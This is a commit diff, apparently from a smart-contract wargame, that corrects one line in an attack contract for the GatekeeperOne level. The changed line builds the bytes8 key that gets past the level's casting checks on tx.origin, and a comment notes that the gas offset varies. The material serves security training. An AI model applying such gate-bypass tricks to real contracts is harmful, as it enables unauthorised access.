corrected GatekeeperOne

+++ contracts/contracts/attacks/GatekeeperOneAttack.sol
@@ -5,7 +5,7 @@ pragma solidity ^0.8.0;
 contract GatekeeperOneAttack {
 
   constructor(address GatekeeperOneContractAddress) {
-    bytes8 key = bytes8(uint64(uint160(tx.origin)) + 2 ** 32);
+    bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) + 2 ** 32);
     
     // NOTE: the proper gas offset to use will vary depending on the compiler
     // version and optimization settings used to deploy the factory contract.
